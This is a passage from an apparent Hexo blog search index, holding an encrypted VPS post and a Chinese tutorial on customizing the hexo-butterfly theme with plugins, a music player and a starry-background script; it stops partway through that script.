57111d21198e48920e4436dd03e90e298f3804879a045972383c8c9d81147c20215765379167def3c103cb7dad43737d413bf8447acc100183c0e34a9efbc23fd9ed1c257340d8efb1d46797c50abdd40be63a82fa2970e828bf6e0f0baace9498060073f78cea1a8fb901d010e0e0e17962240a823a7511e15ebe0b453aaf4a0f2fff4929ff4d4c9d1d7ad02e2b2119f43e8bb4d74b2ab21227143c490992cb9b5ebb27db376647fba6fa065321dab15f5bc5e3415f586590c0828c55a4b418c7955489fd3b5b073f8228dde1f4bd04008a39d40a6067896265007c2b254538c7e43f14d514777be2e71bbabce0500ea12f656af7a973062d94245307d5319299c3b547fbf3a81be41f14c7362aabf516ca201f3eb74e9e2f64cdf4f3c6000fc0a734ae4004c9f597d1ca9c757715e8c2aef2fa5d06474681cf2c4c09a93f960a34c380b07c9a42b11442ce45612eb0125542773fad1cf2bad6be417e79a578730bf0bed92feee6d29baeada4e7ee9d8b16f340a5c432a1d0ce270492f3b5d0341e8be4e5a8c962da4ba738a9e43252c4d953c4dabb948a7d8403f5cf8fac92c90d8c6e6afd74171fff4c9571d850921d1a1617f25b801c71ab87c1d027621ad3df4c6e42ef7c31708832e100f23924d51836e0f1c0f6138b0cdc568d6209509572cce3e965f9a0d85e7f325a302f6320807767254e17019bad5a126f8221ff794784e2291e7eaed8ae27b21677a69312d8c724009ea0f5c4c17728f3091076f11f938f3d0e0c75a6b6da082933bc902c926976cdc1702ee7900c665a0203097d43014b7df4bd2e35c30b066d70d0a3c191c5c6948d2ed1206af844477ffe7a5ecb7a2e5026f27ebc03f25d4468e4f0a1043ca137838fefad42bf030147cc5611a69b6ac9fa4cd0c7e9adc8e99120801571550fa48d1d898f4f7d5c048baabc7a61054c1123e3ed369131a4e662e404d592aee2331851fda05ca93088df45fbe6d13b8cc76a006d12b18038a4ba3113c22559b07e82a95fb5edab011f20527e9cfb0580fe69af7c9bf2376bf0f5a7818c0dedecadd2c6f6246b6f3f9369960e593225eb64bfb55c19f1754d9e972412fe2146a5f57b7e1b42678fe383c015fbb35fd3d7b3e7a7ff37fe2cafc150b8f2417693d8098be1fb7fa2e2a5dbf928c2223c4d18af3ef6e31242240654750279fbee4a7857208aa36b6a4edb2867348f4f9342a30e05a8be5cd7d110656e9fd6fd03128924280d3e54dce4c4fe28a6b682fd14a080def0ad45c33e2f576089c76e098cdb558a7b42914aa3cb04417287e582346ea1bbe99262633b5d551a39c6d496874535869e2ceee2814613e4b7a929076f38fb95e7d78f59cbbfb2ee6430c9b0990b9078caffb46430288b1e5e2d828d7468c54dbd5934b7107c9b5a57933d4cda8d306e0b1a36c7fbd0290843fdc5d1a5ade2568d221487ee844ff51510809b1d699ce66657d7ab594491854110eaa45fb6eb36991fe9c668c9faf224a092841fae34a54f67ef235942403b8050468257d5f18d49da49b7991b2cdd6e4c7c3d0de685d3d9ba4e2d2f64068e3a5e6b611aa9f7c8fef125b54a73b9c2551c0c8a84c00a532092c419d30f518bf26cd1a2abf4bd0370710d3af5dce33afd054a110de4c24da559c03bfb50a8bf5e28c7aaf79aeefefb82b3cea45aaced412279cf0a08a04f9d70cd24685efc445b9e1ba88983241a4ab5675bdbffa79c4149b3c48f7efc55e2f7aafb9b282578b3cb996e9918e00848ebf46f3b66e1a4717066f4d2f30ce7440564295cc246af814a4280cdb4683c3d664f2262b8e993bec02bf774230c3c59d027b8b7109cdf0cf7135f07d4eab0f648725fcdb1550f75b73eb85906af6aa41bcd839ac763c4a1de3f44078629946996e14568f379d7202f4cab7d60878bdd9b6a2aa044dcd27216914edd0fbfcff8a1a73ad2bdd3ec6124bcb40447065cc2c853a887c87eaf6fd6269988704e166bf9ec2826087068d428236c1b618a37e694ec2790c4abc55ae74899fd197609bbd857a070a61336f6e9465a84443cb9cfc9d137b8ec1fcc4df7aa680dbcd09494d560df4bccbe0d48f9a3e5a4e5d73a640f938fe31fe332b0e846ec1b5555b9208347367c5ea2aa58f3d78791cc0b8ae54011256748cf98fa1d3447f1d1b03ab81ddc5f89daaa19e89c86d9dd7744d64fb25a7b5cdc6857f5443388ce160e0bfea1587040146f8ca130d5b9ec28489dd5f7ab8faf5f84671</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> VPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进一步丰富和美化hexo-butterfly</title>
      <link href="/post/afe254ee.html"/>
      <url>/post/afe254ee.html</url>
      
        <content type="html"><![CDATA[<h1 id="0常用命令"><a href="#0常用命令" class="headerlink" title="0常用命令"></a>0常用命令</h1><p>创建新博客:(在blog目录下执行)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post 文件名</span><br></pre></td></tr></table></figure><p>博客写好后部署到本地查看效果:(执行后可以浏览器访问<a href="http://localhost:4000/">http://localhost:4000</a>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><ul><li><strong>hexo cl</strong> : 清除缓存和之前生成的public目录</li><li><strong>hexo g</strong> : 根据source目录来生成新的public目录</li><li><strong>hexo s</strong> : 部署到本地(默认是4000端口)</li></ul><p>部署到github仓库:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="1文章侧边栏的目录问题"><a href="#1文章侧边栏的目录问题" class="headerlink" title="1文章侧边栏的目录问题"></a>1文章侧边栏的目录问题</h1><p>在主题目录下的 _config.yml 中修改:</p><ul><li><strong>number: false</strong> 目录默认不在每一项前增加编号.  当此项为true时,如果在文章标题里增加了编号数字,目录中就会重复添加</li><li><strong>expand: true</strong> 目录默认展开所有小标题,这样看得更清楚</li></ul><p><img src="/images/hexo-butterfly/image-20220723110705308.png" alt="image-20220723110705308"></p><br><hr><br><h1 id="2生成HTML后的文件默认路径问题"><a href="#2生成HTML后的文件默认路径问题" class="headerlink" title="2生成HTML后的文件默认路径问题"></a>2生成HTML后的文件默认路径问题</h1><p>默认情况下,生成public目录后,其中每一篇文章的默认存储路径都是:</p><p><code>**年/月/日/文件名.html**</code></p><p>这样过于复杂,而且在需要设置相对路径的链接时也很不方便</p><p>解决这个问题可以安装hexo-abbrlink插件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><p><img src="/images/hexo-butterfly/image-20220723111258954.png" alt="image-20220723111258954"></p><p>安装完成后,去blog根目录的_config.yml中修改:把之前的注释掉,然后添加圈内的内容</p><p><img src="/images/hexo-butterfly/image-20220723112459827.png" alt="image-20220723112459827"></p><p>这样以来,每次生成的html文件名和路径都是固定且唯一的</p><br><hr><br><h1 id="3本地搜索插件"><a href="#3本地搜索插件" class="headerlink" title="3本地搜索插件"></a>3本地搜索插件</h1><p>安装搜索插件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>安装完成后先去 blog根目录的 _config.yml 中追加这一段:</p><p><img src="/images/hexo-butterfly/image-20220723114707555.png" alt="image-20220723114707555"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索功能</span></span><br><span class="line"><span class="attr">search:</span> </span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span>  <span class="comment"># 搜索后生成的文件路径,可选xml和json两种格式</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span>  <span class="comment"># 搜索范围,post表示所有的文章</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span>  <span class="comment"># 是否包含搜索到的文章的全部内容。如果false，生成的结果只包括标题和创建时间这些信息，没有文章主体。默认情况下是true.</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span> <span class="comment"># 搜索到的内容\选项的形式</span></span><br><span class="line">  <span class="comment"># html:缩略html原文本/   striptags:缩略html原文本,并删除所有标记/  raw:原文本</span></span><br></pre></td></tr></table></figure><p>然后去主题目录下的 _config.yml中修改:</p><p><img src="/images/hexo-butterfly/image-20220723115224625.png" alt="image-20220723115224625"></p><br><hr><br><h1 id="4侧边栏"><a href="#4侧边栏" class="headerlink" title="4侧边栏"></a>4侧边栏</h1><h2 id="4-1个人信息卡片"><a href="#4-1个人信息卡片" class="headerlink" title="4.1个人信息卡片"></a>4.1个人信息卡片</h2><h3 id="4-1-1个人信息"><a href="#4-1-1个人信息" class="headerlink" title="4.1.1个人信息"></a>4.1.1个人信息</h3><p>头像在主题目录的 _config.yml 中修改</p><img src="/images/hexo-butterfly/image-20220725132217868.png" alt="image-20220725132217868" style="zoom:67%;" /><p>作者名在blog根目录的 _config.yml 中的站点信息里修改</p><img src="/images/hexo-butterfly/image-20220725132323932.png" alt="image-20220725132323932" style="zoom:67%;" /><br><h3 id="4-1-2社交小图标"><a href="#4-1-2社交小图标" class="headerlink" title="4.1.2社交小图标"></a>4.1.2社交小图标</h3><img src="/images/hexo-butterfly/image-20220725124659890.png" alt="image-20220725124659890" style="zoom: 67%;" /><p>在主题目录的 _config.yml 中修改<strong>social项下的内容</strong></p><img src="/images/hexo-butterfly/image-20220725124014517.png" alt="image-20220725124014517" style="zoom:67%;" /><p>格式为: <code>图标名(如fas fa-envelope): 图标链接到的网址 || 注释</code></p><p>图标源:<a href="https://fontawesome.com/icons?from=io">https://fontawesome.com/icons?from=io</a></p><p>图标名从这里找(但是经过测试,fa-solid必须换成fas才能生效)</p><img src="/images/hexo-butterfly/image-20220725124518539.png" alt="image-20220725124518539" style="zoom: 67%;" /><br><h3 id="4-1-3按钮"><a href="#4-1-3按钮" class="headerlink" title="4.1.3按钮"></a>4.1.3按钮</h3><p>在主题目录的 _config.yml 中修改 aside(侧边栏)-  card_author- button下的内容</p><img src="/images/hexo-butterfly/image-20220725131933872.png" alt="image-20220725131933872" style="zoom:67%;" /><img src="/images/hexo-butterfly/image-20220806152115223.png" alt="image-20220806152115223" style="zoom:67%;" /><p>添加图标的方法见:<a href="#02_01">12引入图标库iconfont</a></p><br><h2 id="4-2公告栏"><a href="#4-2公告栏" class="headerlink" title="4.2公告栏"></a>4.2公告栏</h2><p>在主题目录的 _config.yml 中修改:</p><img src="/images/hexo-butterfly/image-20220725161114191.png" alt="image-20220725161114191" style="zoom:67%;" /><p>暂时用不到</p><br><hr><br><h1 id="5主页的文章节选"><a href="#5主页的文章节选" class="headerlink" title="5主页的文章节选"></a>5主页的文章节选</h1><p>在主题目录的 _config.yml 中修改:</p><p>method的值(1&#x2F;2&#x2F;3&#x2F;4):</p><ol><li><p>description： 只显示description</p></li><li><p>both： 优先description，如果没配置description，就显示自动节选的内容</p></li><li><p>auto_excerpt：只显示自动节选</p></li><li><p>false： 不显示</p></li></ol><img src="/images/hexo-butterfly/image-20220725133037917.png" alt="image-20220725133037917" style="zoom:67%;" /><p>默认是显示自动节选:(感觉好乱..)</p><img src="/images/hexo-butterfly/image-20220725133258081.png" alt="image-20220725133258081" style="zoom:67%;" /><p>文章的description在每一篇md的front-matter里添加:</p><img src="/images/hexo-butterfly/image-20220725133516670.png" alt="image-20220725133516670" style="zoom:67%;" /><p>修改后:</p><img src="/images/hexo-butterfly/image-20220725133821062.png" alt="image-20220725133821062" style="zoom:67%;" /><br><hr><br><h1 id="6字数统计"><a href="#6字数统计" class="headerlink" title="6字数统计"></a>6字数统计</h1><p>安装插件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>在主题目录的 _config.yml 中修改:</p><img src="/images/hexo-butterfly/image-20220725134327289.png" alt="image-20220725134327289" style="zoom:67%;" /><br><hr><br><h1 id="7文章加密"><a href="#7文章加密" class="headerlink" title="7文章加密"></a>7文章加密</h1><p>不想被别人看见的文章就设置密码来保护一下</p><p>首先安装hexo提供的加密功能插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>在blog目录下的 _config.yml添加字段,启动插件</p><img src="/images/hexo-butterfly/image-20220803113008579.png" alt="image-20220803113008579" style="zoom:50%;" /><p>在想要加密的文章的Post Front-matter字段中添加:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password: 此文章的密码</span><br><span class="line">message: 密码框上方的描述文字</span><br></pre></td></tr></table></figure><p>然后打开加密的文章时就会显示需要输入密码啦(**todo:**这个密码框也太丑了🤨,回来再美化一下)</p><img src="/images/hexo-butterfly/image-20220803115223523.png" alt="image-20220803115223523" style="zoom: 50%;" /><br><hr><br><h1 id="8设置子类别"><a href="#8设置子类别" class="headerlink" title="8设置子类别"></a>8设置子类别</h1><p>在文章开头的front matter字段中这样填写:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">categories: </span><br><span class="line"><span class="bullet">  -</span> category1</span><br><span class="line"><span class="bullet">  -</span> sub<span class="emphasis">_category</span></span><br></pre></td></tr></table></figure><p>这样以来,此文章就会被归为<strong>category1</strong>大类下的<strong>sub_category</strong>子类</p><br><hr><br><h1 id="9使用Aplayer作为底部的音乐播放器"><a href="#9使用Aplayer作为底部的音乐播放器" class="headerlink" title="9使用Aplayer作为底部的音乐播放器"></a>9使用Aplayer作为底部的音乐播放器</h1><p>首先安装<a href="https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md"> hexo-tag-aplayer</a>插件:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-tag-aplayer --save</span><br></pre></td></tr></table></figure><p>在blog根目录的<code>_config.yml</code>中追加如下字段:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># APlayer</span></span><br><span class="line"><span class="comment"># https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md</span></span><br><span class="line"><span class="attr">aplayer:</span></span><br><span class="line">  <span class="attr">meting:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">asset_inject:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>在主题目录下的<code>_config.yaml</code>中做如下修改:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Inject the css and script (aplayer/meting)</span></span><br><span class="line"><span class="attr">aplayerInject:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>修改<code>pjax</code>字段为<code>true</code>确保切换页面时音乐不会中断</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="comment"># - xxxx</span></span><br><span class="line">    <span class="comment"># - xxxx</span></span><br></pre></td></tr></table></figure><p>在<code>inject</code>字段下的<code>bottom</code>后添加HTML代码,意思是将额外的HTML代码添加到页面底部</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br><span class="line">     <span class="bullet">-</span>  <span class="string">&lt;div</span> <span class="string">class=&quot;aplayer</span> <span class="literal">no</span><span class="string">-destroy&quot;</span> <span class="string">data-id=&quot;6770516155&quot;</span> <span class="string">data-server=&quot;netease&quot;</span> <span class="string">data-type=&quot;playlist&quot;</span> <span class="string">data-fixed=&quot;true&quot;</span> <span class="string">data-mini=&quot;true&quot;</span> <span class="string">data-listFolded=&quot;false&quot;</span> <span class="string">data-order=&quot;random&quot;</span> <span class="string">data-preload=&quot;none&quot;</span> <span class="string">data-autoplay=&quot;false&quot;</span> <span class="string">muted&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><p>这里是使用了网易云歌单的接口</p><ul><li><code>data-server</code>的值表示不同的音乐播放平台,如果使用QQ音乐,这里则填写<code>tencent</code></li><li><code>data-id</code>的值表示引入歌单的id,通过网页打开歌单是,从url中就可以看到这个值</li><li><code>data-type</code>数据类型,这类填写<code>playlist</code>歌单就行</li></ul><p>更多配置项含义<a href="https://butterfly.js.org/posts/507c070f">https://butterfly.js.org/posts/507c070f</a></p><img src="/images/hexo-butterfly/image-20220804010553463.png" alt="image-20220804010553463"  /><p>效果:</p><p><img src="/images/hexo-butterfly/image-20220804010315710.png" alt="image-20220804010315710"></p><br><hr><br><h1 id="10-星空背景效果"><a href="#10-星空背景效果" class="headerlink" title="10 星空背景效果"></a>10 星空背景效果</h1><p>在<code>theme\source\css\</code>目录下新建<code>universe.css</code>,并添加如下内容</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 背景宇宙星光  */</span></span><br><span class="line"><span class="selector-id">#universe</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>themes\source\js\</code>目录下新建<code>universe.js</code>,并添加如下内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dark</span>(<span class="params"></span>) &#123; <span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>=<span class="variable language_">window</span>.<span class="property">requestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">mozRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">webkitRequestAnimationFrame</span>||<span class="variable language_">window</span>.<span class="property">msRequestAnimationFrame</span>;<span class="keyword">var</span> n,e,i,h,t=<span class="number">.05</span>,s=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;universe&quot;</span>),o=!<span class="number">0</span>,a=<span class="string">&quot;180,184,240&quot;</span>,r=<span class="string">&quot;226,225,142&quot;</span>,d=<span class="string">&quot;226,225,224&quot;</span>,c=[];<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;n=<span class="variable language_">window</span>.<span class="property">innerWidth</span>,e=<span class="variable language_">window</span>.<span class="property">innerHeight</span>,i=<span class="number">.216</span>*n,s.<span class="title function_">setAttribute</span>(<span class="string">&quot;width&quot;</span>,n),s.<span class="title function_">setAttribute</span>(<span class="string">&quot;height&quot;</span>,e)&#125;<span class="keyword">function</span> <span class="title function_">u</span>(<span class="params"></span>)&#123;h.<span class="title function_">clearRect</span>(<span class="number">0</span>,<span class="number">0</span>,n,e);<span class="keyword">for</span>(<span class="keyword">var</span> t=c.<span class="property">length</span>,i=<span class="number">0</span>;i&lt;t;i++)&#123;<span class="keyword">var</span> s=c[i];s.<span class="title function_">move</span>(),s.<span class="title function_">fadeIn</span>(),s.<span class="title function_">fadeOut</span>(),s.<span class="title function_">draw</span>()&#125;&#125;<span class="keyword">function</span> <span class="title function_">y</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">reset</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">giant</span>=<span class="title function_">m</span>(<span class="number">3</span>),<span class="variable language_">this</span>.<span class="property">comet</span>=!<span class="variable language_">this</span>.<span class="property">giant</span>&amp;&amp;!o&amp;&amp;<span class="title function_">m</span>(<span class="number">10</span>),<span class="variable language_">this</span>.<span class="property">x</span>=<span class="title function_">l</span>(<span class="number">0</span>,n-<span class="number">10</span>),<span class="variable language_">this</span>.<span class="property">y</span>=<span class="title function_">l</span>(<span class="number">0</span>,e),<span class="variable language_">this</span>.<span class="property">r</span>=<span class="title function_">l</span>(<span class="number">1.1</span>,<span class="number">2.6</span>),<span class="variable language_">this</span>.<span class="property">dx</span>=<span class="title function_">l</span>(t,<span class="number">6</span>*t)+(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)*t*<span class="title function_">l</span>(<span class="number">50</span>,<span class="number">120</span>)+<span class="number">2</span>*t,<span class="variable language_">this</span>.<span class="property">dy</span>=-<span class="title function_">l</span>(t,<span class="number">6</span>*t)-(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)*t*<span class="title function_">l</span>(<span class="number">50</span>,<span class="number">120</span>),<span class="variable language_">this</span>.<span class="property">fadingOut</span>=<span class="literal">null</span>,<span class="variable language_">this</span>.<span class="property">fadingIn</span>=!<span class="number">0</span>,<span class="variable language_">this</span>.<span class="property">opacity</span>=<span class="number">0</span>,<span class="variable language_">this</span>.<span class="property">opacityTresh</span>=<span class="title function_">l</span>(<span class="number">.2</span>,<span class="number">1</span>-<span class="number">.4</span>*(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)),<span class="variable language_">this</span>.<span class="property">do</span>=<span class="title function_">l</span>(<span class="number">5e-4</span>,<span class="number">.002</span>)+<span class="number">.001</span>*(<span class="variable language_">this</span>.<span class="property">comet</span>+<span class="number">1</span>-<span class="number">1</span>)&#125;,<span class="variable language_">this</span>.<span class="property">fadeIn</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">fadingIn</span>&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingIn</span>=!(<span class="variable language_">this</span>.<span class="property">opacity</span>&gt;<span class="variable language_">this</span>.<span class="property">opacityTresh</span>),<span class="variable language_">this</span>.<span class="property">opacity</span>+=<span class="variable language_">this</span>.<span class="property">do</span>)&#125;,<span class="variable language_">this</span>.<span class="property">fadeOut</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">fadingOut</span>&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!(<span class="variable language_">this</span>.<span class="property">opacity</span>&lt;<span class="number">0</span>),<span class="variable language_">this</span>.<span class="property">opacity</span>-=<span class="variable language_">this</span>.<span class="property">do</span>/<span class="number">2</span>,(<span class="variable language_">this</span>.<span class="property">x</span>&gt;n||<span class="variable language_">this</span>.<span class="property">y</span>&lt;<span class="number">0</span>)&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!<span class="number">1</span>,<span class="variable language_">this</span>.<span class="title function_">reset</span>()))&#125;,<span class="variable language_">this</span>.<span class="property">draw</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">if</span>(h.<span class="title function_">beginPath</span>(),<span class="variable language_">this</span>.<span class="property">giant</span>)h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+a+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>,h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>*<span class="title class_">Math</span>.<span class="property">PI</span>,!<span class="number">1</span>);<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">comet</span>)&#123;h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+d+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>,h.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="number">1.5</span>,<span class="number">0</span>,<span class="number">2</span>*<span class="title class_">Math</span>.<span class="property">PI</span>,!<span class="number">1</span>);<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;<span class="number">30</span>;t++)h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+d+<span class="string">&quot;,&quot;</span>+(<span class="variable language_">this</span>.<span class="property">opacity</span>-<span class="variable language_">this</span>.<span class="property">opacity</span>/<span class="number">20</span>*t)+<span class="string">&quot;)&quot;</span>,h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span>-<span class="variable language_">this</span>.<span class="property">dx</span>/<span class="number">4</span>*t,<span class="variable language_">this</span>.<span class="property">y</span>-<span class="variable language_">this</span>.<span class="property">dy</span>/<span class="number">4</span>*t-<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>),h.<span class="title function_">fill</span>()&#125;<span class="keyword">else</span> h.<span class="property">fillStyle</span>=<span class="string">&quot;rgba(&quot;</span>+r+<span class="string">&quot;,&quot;</span>+<span class="variable language_">this</span>.<span class="property">opacity</span>+<span class="string">&quot;)&quot;</span>,h.<span class="title function_">rect</span>(<span class="variable language_">this</span>.<span class="property">x</span>,<span class="variable language_">this</span>.<span class="property">y</span>,<span class="variable language_">this</span>.<span class="property">r</span>,<span class="variable language_">this</span>.<span class="property">r</span>);h.<span class="title function_">closePath</span>(),h.<span class="title function_">fill</span>()&#125;,<span class="variable language_">this</span>.<span class="property">move</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">this</span>.<span class="property">x</span>+=<span class="variable language_">this</span>.<span class="property">dx</span>,<span class="variable language_">this</span>.<span class="property">y</span>+=<span class="variable language_">this</span>.<span class="property">dy</span>,!<span class="number">1</span>===<span class="variable language_">this</span>.<span class="property">fadingOut</span>&amp;&amp;<span class="variable language_">this</span>.<span class="title function_">reset</span>(),(<span class="variable language_">this</span>.<span class="property">x</span>&gt;n-n/<span class="number">4</span>||<span class="variable language_">this</span>.<span class="property">y</span>&lt;<span class="number">0</span>)&amp;&amp;(<span class="variable language_">this</span>.<span class="property">fadingOut</span>=!<span class="number">0</span>)&#125;,<span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;o=!<span class="number">1</span>&#125;,<span class="number">50</span>)&#125;<span class="keyword">function</span> <span class="title function_">m</span>(<span class="params">t</span>)&#123;<span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">1e3</span>*<span class="title class_">Math</span>.<span class="title function_">random</span>())+<span class="number">1</span>&lt;<span class="number">10</span>*t&#125;<span class="keyword">function</span> <span class="title function_">l</span>(<span class="params">t,i</span>)&#123;<span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>()*(i-t)+t&#125;<span class="title function_">f</span>(),<span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>,f,!<span class="number">1</span>),<span class="keyword">function</span>(<span class="params"></span>)&#123;h=s.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;i;t++)c[t]=<span class="keyword">new</span> 